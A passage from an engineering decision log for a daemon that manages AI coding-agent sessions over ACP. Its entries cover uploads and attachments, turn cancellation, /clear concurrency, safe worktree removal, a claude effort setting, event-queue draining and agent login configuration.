TypeScript names avoid saying `Permission*` on an elicitation, which is the
`owned` → `sessionOf` failure.

**Status.** Current

### Q2.27 — Are `decline` and `cancel` the same act?

**Decision.** No, and the route offers both. The card offers Skip and Send;
cancel is what stopping the session does, and what every sweep sends.

**Why.** Collapsing them takes one of the two away from whoever is holding
the phone.

**Measured.** Declining runs the tool with empty answers and the turn
*carries on* — the model is told the person skipped — while cancelling throws
and the tool call dies.

**Status.** Current

### Q2.28 — Does anything answer a question on the operator's behalf?

**Decision.** Nothing, anywhere. A session with no resolver never declares
the capability, so the agent is never handed the tool.

**Why.** `Session.onPermission` falls back to allow-once when no resolver is
attached, because that is a defensible default. A question has no defensible
default answer, so it must not quietly decline instead.
`scripts/client.ts`'s auto-answer loop deliberately does not learn about
questions for the same reason, and `harness.ts` prints the form and declines
— which is what made the form measurement in Q2.17 possible.

**Status.** Current

### Q2.29 — May a message be files only, with no text?

**Decision.** Yes. The prompt route validates `attachments` *before* `text`.
Empty with nothing attached is still refused, and `session.ts` drops the text
block entirely when there is no text rather than sending an empty one.

**Why.** A message that is only a screenshot is an ordinary thing to send,
and validating text first made it impossible. An empty message with no
attachment is a mis-tap, and answering it starts a turn about nothing. The
client is deliberately not allowed to paper over the gap by synthesizing
"here is a file": that puts words in the operator's mouth inside the model's
context, where the model reads them as instructions. Two things follow that
are easy to get wrong. `deriveSessionTitle` still reads the text alone, so a
files-only first prompt leaves the session **unnamed** and the client falls
back to its path — which is the outcome that comment always argued for,
though it used to argue for it from "a files-only prompt is refused anyway",
which is no longer true. And `canSend` on the client has to agree with the
route, or Send is enabled onto a `400`.

**Status.** Current

### Q2.30 — When is an attached file uploaded?

**Decision.** On select rather than on send. `POST
/sessions/:id/uploads?name=` streams a raw body to
`~/.reemoat/uploads/<sessionId>/<uploadId>/<name>` and answers
`{uploadId, …}`; `POST /sessions/:id/prompt` then takes `{text, attachments:
[uploadId, …]}`.

**Why.** The daemon has to mint the id before a prompt can name it, so
uploading at send time would turn Send into a thirty-second operation with no
way to tell the network from the agent, and a limit refusal should arrive
while somebody is still at the picker.

**Status.** Current

### Q2.31 — What content blocks does an attachment become?

**Decision.** Every attachment becomes a `resource_link` block with a
`file://` URI. An `image` block with base64 bytes is added *on top* when the
agent advertised `promptCapabilities.image`.

**Why.** ACP requires every agent to support `resource_link`, which is
exactly why the paperclip needs no capability gate. The image block is added
on top rather than instead, because the link is what lets the agent re-read
the file with its own tools. `promptCapabilities` had never been read
anywhere before this; `AcpClient.acceptsImages()` is the one accessor, and it
compares `=== true` rather than `!= null` because `sessionCapabilities.resume`
beside it is an empty-object *marker* while this is a declared boolean — two
capability shapes in one payload, read two ways on purpose.

**Status.** Current

### Q2.32 — Is a text fallback needed to make an agent read an attachment?

**Decision.** No. `resource_link` alone is enough, and no text fallback is
built.

**Why.** The alternative — appending the absolute paths into the text block —
would have put words in the operator's mouth inside the model's context, and
it is not needed.

**Measured.** 2026-08-04, against both live agents: a `secret.txt` was staged
and named by a prompt asking for the codeword inside it; claude issued a
`Read File` tool call and answered `TANGERINE-47`, kimi issued `Read` and
answered the same.

**Status.** Current

### Q2.33 — Why does claude ask permission to read an attachment?

**Decision.** Because the upload root is outside the workspace. Nothing here
suppresses the prompt.

**Why.** It is the permission machinery doing its job on a path outside the
session's tree — correct behaviour rather than a defect, though surprising
the first time, and the price of not writing attachments into somebody's real
checkout. A client that pre-approved its own uploads would be deciding on the
agent's behalf about a path the agent chose to read.

**Measured.** The same 2026-08-04 run: claude asks `Read
/…/uploads/<session>/<upload>/secret.txt`, with an `allow_always` option
scoped to that upload's directory, while kimi reads it without asking.

**Status.** Current

### Q2.34 — Does `promptCapabilities.image` ride the session snapshot?

**Decision.** No. The honest home for the fact is `inlined` on the recorded
attachment.

**Why.** The capability only exists while an agent is running, so it would be
`boolean | null` on a list that is mostly terminal and restored rows; nothing
acts on it; and the snapshot's admission rule is tiny *and* helps answer
*does anything anywhere need me*. `inlined` is a result rather than a
prediction, and durable in the log.

**Status.** Current

### Q2.35 — What can be read back out of a session?

**Decision.** Any regular file under `workspace.root`, plus the session's own
uploads: `GET /sessions/:id/files?path=` and
`GET /sessions/:id/uploads/:uploadId`.

**Why.** The first fills a gap that was narrow and real: `changes/diff`
deliberately refuses binary, so a chart or a build artifact was visible in the
transcript as a path and unreachable as bytes. It is **not** restricted to
the git change set the way `changes/diff` is — somebody asking an agent for a
file often means one that was already there — and it widens no real
authority, because the agent can `cat` anything under that root already. The
second route is not optional: uploads live *outside* the workspace on
purpose, so without it a chip on a message somebody sent themselves would be
the one thing in the transcript that cannot be opened.

**Status.** Current

### Q2.36 — Where does the upload index live?

**Decision.** In SQLite, as a new table. `SCHEMA_VERSION` stays 6.

**Why.** The argument is accounting rather than describability. A `prompt`
event carries name/mime/bytes, so a transcript describes an attachment from
the log alone — an in-memory registry in `agentauth.ts`'s shape would pass
that test. It fails the per-session byte budget: a restart resets every total
to zero, and a restart is the ordinary outcome of `deploy.sh`.
`agentauth.ts` gets away with memory because a pty dies with its parent; a
file does not. The version stays at 6 because bumping it would make
`refuseNewerSchema` refuse every rollback, to buy nothing.

**Status.** Current

### Q2.37 — Why is an upload's name sanitized where a path would be refused?

**Decision.** An upload's name is treated as a **label, not a location**: it
is sanitized and capped at 200 bytes rather than refused, and the response
echoes the original.

**Why.** `safeRelPath` refuses because it locates a file in an existing tree,
where a bad path has nothing salvageable in it. An upload's file is created
inside a directory named by 64 fresh random bits, so containment comes from
the path and never from the name. What is still refused is what would be
*dangerous* rather than ugly — control characters above all, because that
string is echoed into a `Content-Disposition` header where a CR is response
splitting. The 200-byte cap is a third answer beside this codebase's existing
two: not `clip`'s `…[truncated N bytes]` marker, which is right for prose and
wrong for a name, and not the command-name *refusal* either, because a
filename is neither invoked nor read as prose.

**Status.** Current

### Q2.38 — How does the browser download a file from a session?

**Decision.** `fetch` with the credential in a header, into a `Blob`. The
filename comes from the requested path.

**Why.** The download path was very nearly `<a href="…&token=…" download>`,
and it lost on four counts of which the third decides it: a token lives 300s,
so an href baked into old transcript DOM 401s; `download` is *ignored*
cross-origin anyway; it would **widen the `?token=` exception**, which
`machine.ts` justifies narrowly as "a browser cannot set headers on a
WebSocket" and here it can — and which nothing *enforced* at the time this was
written, so the third reason was an argument about discipline rather than about
the code; `readCredential` enforces it now (Q1.45); and the URL lands in history
and logs. Two
consequences follow from `cors.ts` sending no
`Access-Control-Expose-Headers`: `Content-Disposition` is **unreadable**
cross-origin, so the filename comes from the requested path — which also
means no RFC 5987 parser has to exist in a browser — and `Content-Length`
**is** safelisted, so an oversized file is refused before it is resident.

**Rejected.** The `<a href="…&token=…" download>` form, for the four reasons
above.

**Status.** Current

### Q2.39 — What else may talk to the agent while a `/clear` is in flight?

**Rule.** Nothing. `ManagedSession.clearing` is set before `await
session.clearContext()` and released in a `finally`, and **all four** methods that
reach the agent test it: `prompt` and `clearContext` answer `busy` → `409
turn_in_flight`, and so do `setConfigOption` and `setMode`.

**Why.** A clear is a `session/new` followed by a `session/close` — measured at
~600ms to 15s — and for that whole window the session holds **no turn**, so every
guard written as `this.turn !== null` waved everything through. Three concrete
outcomes, none of them visible: a prompt was issued against the ACP session id
about to be unregistered and closed, so its updates hit `router.sessions.get(<old
id>)` and were dropped and the turn died with the close — a message sitting in the
transcript that reached no model; two concurrent clears both captured the same
`previous` and left the intermediate conversation live inside the agent with
nothing left to close it; and a mode chosen inside the window raced
`restoreConfig`, which re-applies a `wanted` snapshot captured *before* the change,
so the selection was silently reverted to the pre-clear one — which is the exact
failure `clearContext`'s own docblock says the restore exists to prevent.

**Why all four and not the two that start a turn.** The first version of this
guarded `prompt` and `clearContext` and its docblock said "nothing else may talk to
the agent while it runs". That is the `sessionOf` shape: a property asserted in
prose that the code does not enforce, and `AgentConfigBar` sits beside the composer,
so `/clear` and then a mode change is one tap apart. Making the sentence true cost a
`busy` arm on `AgentConfigResult`, which is the honest price of it.

**The marker is deliberately not a turn**, so `status` still reads `idle` beside a
`409 turn_in_flight`. It looks like a bug and is not; `daemoncheck` pins the pair
for that reason.

**Consequence.** A clear that hangs on a slow agent refuses prompts for up to
`NEW_SESSION_TIMEOUT_MS` rather than accepting them into the void.

**Measured.** `daemoncheck` holds `session/new` for 200ms against a registry, an
app and a second agent rig: `prompt` is `busy`, a second `clearContext` is `busy`,
the route answers `409 turn_in_flight` with `status: "idle"`, and then the clear
still lands, closes the old conversation, the session takes messages again — the
`finally` control — and exactly two conversations were ever opened. Pre-fix the
prompt is accepted, the second clear opens a third, and the route answers 202.

**Status.** Current

### Q2.40 — Can a launch that came back late be adopted as the live session?

**Rule.** No. `launch()` passes its own promise to `onStarted(starting, session)`
and `onStartFailed(starting, error)`; both return early when `this.startPromise !==
launch`, and `onStarted` **disposes** the session it declines before
`this.session` is assigned.

**Why.** `startAbandoned` was the only guard, and `armForStart()` clears it on the
very next resume — so a launch that timed out at `START_TIMEOUT_MS` (45s) and
resolved at 48s was adopted as the live session and then overwritten by the retry's
agent. Nothing bounds `session/new` or `session/resume` end to end, so that is
ordinary rather than exotic. The displaced agent is spawned `detached`, referenced
by nothing, survives the daemon's exit, and is invisible to the next boot's reaper
because no row names its pid: it holds the worktree for the machine's uptime. The
mirror case closes with it — a stale *rejection* used to write an `exitRecord` onto
the freshly re-armed life, marking a starting session terminal for ever.

**Why identity rather than another flag.** This is the `this.session !== session`
rule every other late-notification path in the registry already applies, extended to
the one path that had only a mutable boolean. `startPromise` is written in exactly
two places (`launch`, `armForStart`), which is what makes the promise the identity.

**Consequence.** Any future code that reassigns `startPromise` without meaning to
supersede the launch would have its agent disposed rather than adopted.

**Measured.** `daemoncheck` counts disposals through `endStdin`: a `stallMs: 150`
agent against a 20ms budget times out and restores `daemon_restarted`, the retry
re-arms the session (clearing `startAbandoned`, the window the old guard could not
see) and brings it back idle, two agents are really launched and both really
resumed, and `disposed() === 1` **before** anything is stopped. Adopt it instead and
that reads 0 with everything else green.

**Status.** Current

### Q2.41 — What does a worktree removal do when it could not tell?

**Rule.** It refuses, with a code that says so. `removeWorkspace` reads
`unpushed`/`commitsAhead`/`dirty` three-valued: `null` raises a `counts_unknown`
refusal carrying `about: "dirty" | "commits"`, and only a real number is compared
with `> 0`. git declining the removal in its own words raises `remove_refused`
carrying git's stderr. `--force` overrides both.

**Why.** `count()` and `countStatus` collapse a 5s/15s timeout, a 128 off a stale
gitfile, oversized output and a parse failure into one `null`, and `?? 0` turned
every one of those into "there is nothing to lose". So a non-forced `DELETE
…/workspace?deleteBranch=1` reached `git branch -D` over commits that existed in no
other ref and on no remote, and a failed `git status` skipped the dirty refusal in
front of the one `rmSync` in this codebase. The rule "`null` means could not tell
and must never read as zero" was already written down; nothing enforced it.

**Why `remove_refused` matches git's words rather than "the call failed".** git
declining because the tree holds work was pushed onto `warnings` and execution
carried on into `rmSync(root, {recursive: true, force: true})`, deleting exactly
what git had refused to delete and answering `200 {removed: true}`. Gating the
guarded `rm` on git having *succeeded* would disable its actual job — a stale
gitfile, an unregistered directory, half-written admin metadata — so the match is on
`contains modified or untracked files|use --force`, the technique
`classifyAddFailure` already uses. The prune is skipped on that one path, which is
safe: a worktree git just refused to remove is still registered and still present.

**And the sentence at the boundary had to be derived, or the fix was undone.** The
route answered every refusal `409 workspace_dirty` / "this worktree still holds
work", which is the opposite of what `counts_unknown` means — and
`scripts/client.ts` prints `error.message`, walks nothing else, and then suggests
`--force`. So an operator was told a stale-gitfile worktree *definitely* holds work
and invited to force-delete it on that evidence: the `?? 0` defect restored at the
only place anybody reads it. `removalRefusalAnswer` keeps the 409 and keeps
`--force` as the remedy for everything, and splits only the code and the sentence —
`workspace_dirty` while any definite refusal is present (the string
`scripts/client.ts` keys its hint on), `workspace_uncertain` when only uncertain
ones are.

**Consequence.** Removals that used to succeed on repos where git is slow or the
worktree metadata is broken now refuse — deliberately, since those are exactly the
cases where the count was unknowable.

**Measured.** `daemoncheck` drives a scripted `GitExec` against real checkouts,
because what has to be driven is git *failing to answer*: an unknown commit count
refuses, leaves the file on disk and issues neither `worktree remove` nor `branch
-D`; an unknown dirty count refuses and leaves the checkout alone; git's own "use
--force" wording refuses, carries the stderr, leaves the work on disk and skips the
prune; a clean removal still removes, deletes the branch and prunes — the control,
without which every refusal above passes for a function that refuses everything; and
`--force` still overrides both and passes git the flag. Reverting `?? 0` deletes the
file and the branch in the first case.

**Status.** Current

### Q2.42 — Can you stop the agent without ending the session?

**Rule.** Yes, and it is a different verb from `stop`. `POST
/sessions/:id/cancel` → `ManagedSession.cancelTurn` sends ACP's `session/cancel`
notification, sweeps anything parked on a human, and changes nothing else: the
agent process stays up, the conversation stays loaded, no `exitRecord` is written
and the next message is an ordinary prompt rather than a resume. `DELETE
/sessions/:id` remains what kills the agent.

**Why.** There was no way to stop an agent mid-turn short of killing the session,
which costs the loaded conversation and turns the next message into a resume. The
one signal a person has when an agent starts down the wrong path is the one this
daemon did not carry — and `session/cancel` was already implemented, sent from
exactly one place (`doDispose`) as part of teardown, so the protocol work was
already done and only the verb was missing.

**Why "cancel" and not "interrupt".** `interrupted` is already a session *status*
in this codebase, meaning "the daemon ended this and it is coming back", derived
through `endedWithDaemon` and asserted as a partition in `webcheck`. A feature
called interrupt would have made four passages of `CLAUDE.md` ambiguous about
which of two states they described.

**Why the order is send → sweep → watch.** ACP requires a client that has
cancelled to answer any pending `session/request_permission` with `cancelled`, and
until it does, an agent parked on one is not executing anything that could notice
the notification: it sits in the pipe behind a reverse-RPC the agent is still
waiting on. Sweeping *first* would tell the agent its tool call was abandoned
while leaving it free to choose another. Waiting *before* sweeping would spend the
whole budget and report `settled: false` on every blocked session — which is the
session most worth cancelling. Both wrong orders are green against an agent that
answers immediately, which is why the driver's stub does not.

**Why it asks rather than forces.** Cancellation is a notification: no response,
no acknowledgement, nothing that obliges an agent to act. `Session.cancelTurn`
returns `void` to say so, and whether the turn ended is a separate observation
(`awaitTurnEnd`, 1500ms) reported as `settled`. `false` means "had not finished
when we stopped watching", never "refused" — the turn ends into the transcript
whenever the agent gets there. The escalation already exists and is `stop`.

**Why no new event type.** The turn's own `turn_end{stopReason: "cancelled"}` is
already drawn by the transcript as a turn that did not finish, and a
`permission_resolved` records anything that was swept. A dedicated event would put
a second row on screen for one act. What the log genuinely cannot say — that an
agent has been asked and has not yet answered — rides the snapshot as
`cancelRequestedAt`, in memory rather than in SQLite because after a restart there
is no turn to have cancelled.

**Why `no_turn` is a 200.** Nothing was stopped and nothing is wrong: the caller
asked for an agent that is not working and it is not working. It is also what an
ordinary lost race looks like, since the tap and the turn's own end are ordered by
nothing, and a red error there makes the control look broken at the moment it did
its job. `terminal` and `not_ready` stay 409s, because those report something the
caller does not know.

**Consequence.** `sweepPending` has a second caller, so `CLAUDE.md`'s sentence
attributing it to `doStop` alone is no longer true; `AnswerResolvedBy` gains
`turn_cancelled`, distinct from `session_stopped` (which claims the session is
over) and from `turn_ended` (which the pump writes afterwards, and which may never
come); and `clearing` now guards five methods rather than four, with `cancelTurn`
testing the marker *before* `turn` — the other order answers `no_turn` about a
session mid-`/clear`.

**Measured.** `daemoncheck` drives three agents through the route. One that
answers `cancelled` when asked: 200, `settled: true`, the session idle with no
exit, `turn_end` recorded as cancelled, and the notification really sent — checked
explicitly, because `session/cancel` carries no `id` and a stub without an arm for
it discards it in silence, which would make every other case pass against a daemon
that sends nothing. One that answers only once the client settles its permission:
`settled: true`, the agent handed `{outcome: "cancelled"}`, and the resolution
logged `by: "turn_cancelled"` — this is the case that fails under either other
ordering. And one that never answers at all: 200, `cancelled: true`, `settled:
false`, the session still `running`, and `cancelRequestedAt` still a number.
Cancelling an idle session sends nothing; cancelling twice sends twice; a
`/clear` in flight answers `409 session_busy`; an ended session answers `409
session_terminal`. `webcheck` pins `canCancelTurn` being wider than `showsWorking`
by exactly the blocked row, `cancelInFlight` reading `undefined` as no cancel, and
the route being absent from `slowRoute` deliberately.

**Three defects an adversarial review of this change found, each now a rule.**
*The ordering was stated and not driven.* Every assertion in the parked block was
satisfied by a sweep that ran first — `outcome: "cancelled"` is this daemon's own
constant and says what we sent, not what the agent heard — so one more line
asserts the *stop reason*, which is the agent's word and reads `cancelled` only
when the notification arrived before the answer that freed its turn. Measured by
putting one yield between the two statements: the wire order becomes answer →
`turn_end{end_turn}` → cancel, and that line is the only one in the file that goes
red. *`canCancelTurn` read `isTerminal` alone*, and `stopRequested` reaches the
wire as `status: "stopping"`, which is not terminal — and `turn` is not cleared
until `pump`'s `finally`, which waits on `dispose()`'s 5s cancel grace, so the
composer drew an armed Stop for seconds onto a guaranteed 409. *`stopping` had the
late-write gate and not the reset.* Shared React state on a component the two-pane
layout never remounts, cleared only under `onScreen()`: a cancel outliving a
session switch left the send slot a spinner for every session afterwards, with no
path back — the Stop button is not drawn while it is set and `cancelTurn`
early-returns on it. `webcheck` now asserts the gate/reset *pair* for every shared
flag on that effect's own region.

**Status.** Current

### Q2.43 — claude has a setting ACP cannot carry. How is it offered?

**Decision.** As a seventh row on the agent's own effort control, added by the
daemon and unknown to the browser. `ultracode` is claude's own session setting —
*"xhigh effort plus standing dynamic-workflow orchestration"* — and the SDK says
it is provided by `--settings` or an `apply_flag_settings` control request, both
of which are outside ACP. `sessionMetaFor` puts it on `_meta.claudeCode.options`
of `session/new`, `session/resume` and the `session/new` inside `clearContext`;
`withUltracode` adds the choice to the snapshot; `setConfigOption` intercepts the
value above the ACP call. `REEMOAT_CLAUDE_ULTRACODE=1` is the machine's default
for a session nobody has decided about.

**Measured.** `@anthropic-ai/claude-agent-sdk` 0.3.220 `sdk.d.ts:6319` for the
setting and its own note about how it is normally supplied;
`claude-agent-acp` 0.63.0 `acp-agent.js:4091` — `userProvidedOptions =
sessionMeta?.claudeCode?.options`, spread into the SDK options beside `settings`
at `:4144`. The effort control itself is built at `:4838` from the *current
model's* `supportedEffortLevels`, which is why `xhigh` among the published choices
is the capability test rather than a model name.

**Why the row rather than a switch of our own.** It is where claude's own
interface has it, and the strip beside the composer is where somebody reaches for
it. The cost is that this is the single place in the product where a control on
screen is not something an agent published — accepted, and confined to the daemon
so that the rule `packages/web` lives by ("the values are never hardcoded") stays
true there.

**Why the overlay is snapshot-only.** `setConfigOption` validates against the
live `agentConfigState`, which never grows this choice, so the value cannot reach
the agent as an ordinary selection even if the interception were removed.
`daemoncheck` asserts the input config is not mutated, because that is the one
mistake that would open the path.

**Why the *selection* is ours too, and the prediction that was wrong.** The first
version of this entry expected the chip to flip to `Xhigh` by itself once the flag
landed, and said so as the way to verify it. Measured 2026-08-11 on a live daemon:
it does not. The effort option's `currentValue` is built from
`Settings.effortLevel` (`acp-agent.js:4405`), a *different* key from `ultracode`,
so a session running with the flag on still publishes `effort=default`. Hence
`withUltracode` reports the selection itself — otherwise the row somebody just
chose would be permanently unticked, i.e. a control that says "nothing happened"
every time it works.

The consequence worth stating plainly: **nothing over ACP confirms the flag took
effect.** The evidence is behavioural. What is assertable is what the daemon
*sent*, so `daemoncheck` stands in as the agent and reads the `_meta` off the
`session/new` it received — a request parameter no listener can otherwise see.

**Why choosing it restarts the agent.** The setting is read when a conversation is
opened. Turning it *off* therefore means opening one without it, and there is no
live channel for either direction — `apply_flag_settings` is an SDK control
request the adapter does not expose. `applyUltracode` writes the choice, then
`stop("config_changed")` + `resume()` on the same `agentSessionId`, which is the
machinery a deploy already uses and keeps the conversation. A turn in flight
refuses with `409 turn_in_flight` — the one refusal on `/config` that really is
about a turn, since every other option is applied live.

**Rejected — writing a settings file.** `settings` can also come from
`~/.claude/settings.json` or a `--settings` path, and the daemon controls neither
the CLI's argv (the adapter builds it) nor anybody's home directory. Writing there
would be a machine-wide change made on a per-session tap, and would collide with
whatever the operator has already put in that file.

**Rejected — typing the keyword for them.** The `ultracode` keyword works in a
prompt today: the adapter stamps `origin: {kind: "human"}` on every ACP prompt
specifically so the CLI's `isHuman()` gate accepts it. A client that appended the
word to each message would be putting words in the operator's mouth inside the
model's context, which is the same refusal the composer makes about synthesizing
"here is a file".

**Why the stored choice is three-valued.** `sessions.ultracode` is nullable on
`owner_subject`'s grounds rather than `pinned`'s: "nobody chose" follows the
environment at every launch and "chose off" outranks it for ever. A `0` meaning
both would leave every session that predates the column — and every session
created before somebody flipped the switch — permanently disagreeing with the
machine's own setting.

**Status.** Current

### Q2.44 — The conversation goes quiet, then a message produces five minutes of unrelated dialog. Why?

**Symptom.** A session waiting on background work read as **finished** — no
spinner, no working line, an offered Send. Sending anything made a wall of
dialog appear at once, none of it about the message just sent, so the operator
was interrupting a live turn without knowing.

**Measurement.** Live log, session `s_019d3a30`, agent claude. `turn_end` at seq
835 (13:37:23.445), then **294 907 ms** of silence, then a `prompt` at seq 836
(13:42:18.352) followed by **57 events stamped inside a 2 ms span** — content:
*"Reviewers still running"*, *"Waiting on the reviewers"*, *"Two of five
reported. Waiting."* A second burst repeated it: 394 694 ms, then 64 events in
4 ms. `store/sqlite.ts` stamps at append, so those are the times the daemon first
learned, not the times it wrote. Neither backlog contained a `turn_end`, which is
what rules out "hold the turn open": the turn genuinely ended.

**Cause.** `EventQueue` is single-consumer and its only consumer was the
generator returned by `Session.prompt`, which returns on `turn_end`. Everything
the agent emitted afterwards was buffered with nobody reading. The queue's own
comment stated the premise — *"Nothing drains this between turns"* — written
about idle stderr and equally true of `session/update`.

**Ruled out first**, each against the code: `Session.toolDraft` (flushed before
`turn_end`, holds at most one event for one call); a dead WebSocket (the events
would carry their real timestamps and real seqs); a client render or memo bug
(the events were not in the store at all during the silent window); the daemon's
own `4401` expiry close.

**Decision.** Drain the queue between turns, in `ManagedSession` rather than in
`Session` so a bare `Session` — `harness`, the Session-level drivers — is
untouched. Ownership of the queue becomes a checked monotonic claim: `next()` had
parked its resolver unconditionally, so a second consumer silently overwrote the
first and the displaced one never settled, which is a **hang** rather than a
mismatch.

**What was deliberately not done.** `status` is untouched — a clock in it would
break *"Status is derived, never stored"*, and a new `SessionStatus` member falls
silently through `statusTone`'s `default` with no mirror assertion. The turn is
not held open, which would make `canCancelTurn` true for a turn that ended and
answer `409 busy` for ever. `showsWorking` is not widened, because it is what
refuses Send: widening it removes the control in the one state whose only exit is
using it. Send stays enabled — the complaint was not knowing, not being unable to
type.

**The second half of the bug, which nobody reported.** Past
`MAX_BUFFERED_EVENTS` the backlog was not delayed but **evicted** — the head
shifted out and replaced by a placeholder. The driver reproduces it: with the
drain disabled, a 2500-event burst comes back as `burst 1998`.

**Cost, stated.** `agent_log` and `other` are dropped out of turn rather than
recorded. That is exactly what the queue already evicted first — a count over
five of this fleet's database snapshots, 95 618 events, holds **zero**
`agent_log` rows — so it preserves today's behaviour rather than losing anything
new. Recording them would put an unbounded stderr stream into a per-session log
that is deliberately `Infinity`/`Infinity`, make `REEMOAT_LOG_EVENTS` harmful
(prefix eviction takes the first prompt), spend the tab's 16 MiB ceiling, and
bury a reattaching phone behind `ATTACH_REPLAY_MAX`, which is a seq window.

**The indicator, and what it cannot see.** `outstandingTasks` draws `waiting for
N tasks` at the foot of the transcript, from the tail rather than the snapshot.
⚠ **It would have read 0 for the whole of the outage above** — at seq 836 the
number of open calls of any kind was zero, because the work being waited on was
behind a call that had already reported `completed`, and no ACP message describes
it. It is the only honest client-side signal available; the drain is the fix.

**Status.** Current

### Q2.45 — Choosing `ultracode` moved the mode to Manual. Why, and what fixes it?

**Symptom.** Two independent controls, and one moved the other: turning on
`ultracode` — a row on the *effort* chip — put the **mode** back to `Manual`.

**Cause.** `Manual` is claude's own name for mode id `default`, so the report
means the fresh conversation's default came back. `applyUltracode` is
`stop("config_changed")` then `resume()`; `doStop` clears `agentConfigState` and
`onStarted` reassigns it from whatever the new process published, with nothing in
between. `/clear` has had `Session.restoreConfig` for exactly this since it was
written — `clearContext` captures `this.config` before overwriting it — and this
path did the structurally identical thing with the capture missing.

**Decision.** Capture `agentConfigState` before the stop and replay it through
`restoreConfig` after the resume. Awaited inside `applyUltracode`, so the
restored mode is already in the snapshot `setConfigOption` returns and the screen
never flashes `Manual`.

⚠ **`snapshot().agentConfig` is the wrong capture** and was rejected: it is
composed through `withUltracode`, which rewrites the effort value to the invented
`ULTRACODE_CHOICE` that this daemon guarantees never reaches an agent, and
through `dedupeAliasChoices`, which rewrites the model value off its `default`
placeholder onto a concrete model — silently pinning the model on a session whose
operator chose to let the agent decide.

**Two latent bugs fixed on the way**, both in `restoreConfig`'s withdrawal
guards. The option guard read `option.choices` — the list off the *same object
the value came from* — so the predicate was true by construction and the rule its
own docblock describes had never fired. The mode branch had no guard at all,
which is the sharper omission, since that docblock's own cited example
(`bypassPermissions` under root) is a *mode*. Benign while this only ran after a
`/clear`, where the two conversations are one agent moments apart; not benign on
a restart path, where the agent may be a new binary.

**Scope, deliberately narrow.** Three other paths reach a fresh agent and lose
the mode the same way — the boot/auto-resume pass, `POST /sessions/:id/resume`,
and a prompt that resumes first — because `agentConfigState` is in memory. They
are unchanged rather than regressed. Closing them needs a schema migration, and
replaying a mode onto a new agent binary after a deploy is a policy decision
nobody asked for.

**Status.** Current

### Q2.46 — Should a folded run of tool calls open itself?

**Decision.** No. `GroupRow`'s disclosure is `override ?? false` — nothing but a
tap opens it.

**Two facts have been tried in that slot and both were reported as bugs**, which
is why the assertion now pins the constant rather than whichever fact is
currently allowed. `failed > 0` came first: `override` is component state and
dies on reload while a failure is permanent, so a group somebody deliberately
collapsed came back open on every refresh for ever. `node.live` replaced it and
failed the other way — the newest run drew expanded until the agent stopped
calling tools, so machinery a reader had folded away unfolded itself on every
turn, and the row whose height nobody chose was the one at the foot of the page.

**What `node.live` is spent on instead.** The hollow pulse on the collapsed row.
Without a consumer it would be a field three `webcheck` assertions describe and
nothing renders — the `sessionOf` failure, in the direction this repository names
it for. A run of one is never wrapped, so a lone call keeps its own spinning
`Loader`; only a run of two or more was relying on being open to say so.

**Status.** Current

### Q2.200 — Which environment variable does a pasted codex key go in?

**Behaviour.** `CODEX_API_KEY`, and **not** `OPENAI_API_KEY`. A key pasted into
it reaches the model's API calls and does **not** by itself start a session.

**Why.** The obvious variable name is not always the right one, so every entry in
`AGENT_LOGIN[agent].envNames` is measured rather than assumed. The incomplete
paste path is survivable only because the login probe runs *with* the pasted
credential in its environment: `codex login status` still saying "Not logged in"
is a clean `false`, and a clean `false` beats a token we know we handed over.
Whether `codex login --with-api-key` closes the gap is Q7.65.

**Measured.** The two names are told apart by *which* rejection comes back: with
`CODEX_API_KEY` set the API answers `invalid_api_key` — it saw a key and refused
it — while with `OPENAI_API_KEY` it answers "Missing bearer", i.e. nothing was
sent. The same run measured the limit of the paste path there: with a key in the
environment and no `auth.json`, `codex-acp` still refuses `session/new` with
-32000.

**Status.** Current

### Q2.201 — Does kimi read `KIMI_API_KEY` out of the environment?

**Behaviour.** Both, about different code paths. Its raw model client reads the
variable; the provider manager does not, so which one applies is a fact about
that installation's config file rather than about kimi.

**Why.** `resolveAgent`'s `authHint` said kimi does not read `KIMI_API_KEY` from
the environment while `AGENT_LOGIN.kimi.envNames` said it does, and the
contradiction stood because neither side could have won by reading harder — they
were describing different paths through the same binary.

**Measured.** Against kimi 0.29.2: the raw model client reads
`options.apiKey ?? process.env["KIMI_API_KEY"]`, so the slot is real; the
**provider manager** — the path a `managed:kimi-code` provider takes — resolves
the key from `provider.env`, a TOML table in `~/.kimi-code/config.toml`, and
never looks at the process environment.

**Status.** Current

### Q2.202 — Is "can this agent be logged in" a question about the host?

**Rule.** About the agent as well, and it is answered before the button is drawn.
`loginSupport(agent)` folds three facts into one answer: `script` is on PATH,
that agent's CLI resolves (a different binary from the adapter), and whether its
flow reads stdin at all.

**Why.** The daemon-wide `SessionRuntime.loginSupported` reported only the first,
so an agent whose CLI was missing got an enabled button and a
`503 login_unsupported` after the tap, with the reason only in the daemon's own
log. `loginSupported` is still sent, for an older client.

**Status.** Current

### Q2.203 — What does the agent screen draw for an agent that is already signed in?

**Decision.** The word **Signed in** and exactly one control, Sign out. Switching
accounts is sign out then sign in, and pasting a token sits behind "Paste a token
instead".

**Why.** Every control on that screen has to be true in the state it is drawn in.
An accent "Sign in to claude" over a signed-in agent proposed what had already
happened, and a demoted "Sign in again" beside the sign-out was the same mistake
smaller: two buttons for one state. Two equal-weight unfamiliar options is what
made the card read as a developer tool in the first place. The subtler failure is
that `agentEnv` merges pasted secrets **last**, so a card reading "Signed in" may
be describing a credential the agent is not using.

**Measured.** A sweep for controls that were not true in the state they were
drawn in found five. Three were on a permissions panel that has since been
removed; two stand. "Paste a token **instead**" was rendered over a signed-in
agent with no sign-in on offer — instead of what — and hid the fact that a token
was stored at all. The section heading said "Sign in" over a Sign out button.
Neither was a crash; both were the screen stating something it could not know.

**Status.** Current

### Q2.204 — Why does the codex wizard pass `--device-auth`?

**Decision.** Because codex says so, and `daemoncheck` pins the flag.

**Why.** A bare `codex login` binds a local server on port 1455 and waits for a
browser; the CLI itself prints *"On a remote or headless machine? Use `codex
login --device-auth` instead."* — and this daemon is exactly that machine. The
device form prints a URL and a code that expires in 15 minutes, which is the
shape kimi's flow already has and the one the wizard's poll-and-display loop was
written for. Dropping the flag leaves a login that still *starts* and then times
out, indistinguishable from a network fault.

**Status.** Current

### Q2.205 — How is the binary a login drives resolved?

**Rule.** `resolveLoginBinary` reads the agent's `executableEnv` first, from the
`AGENT_LOGIN` table rather than from a name written out at the call site, and
falls back to `vendoredCli` — a `switch` with no `default` arm. `daemoncheck`
pins the pair by name.

**Why.** The lookup used to be an `agent === "claude"` test, and **two** of the
three agents have such a variable: `CLAUDE_CODE_EXECUTABLE` and codex's
`CODEX_PATH`, both read by the adapter's own `startAcpServer()` and therefore
deciding which binary *sessions* run. Under that test codex's override picked the
session's binary while the login and the probe went on resolving the vendored
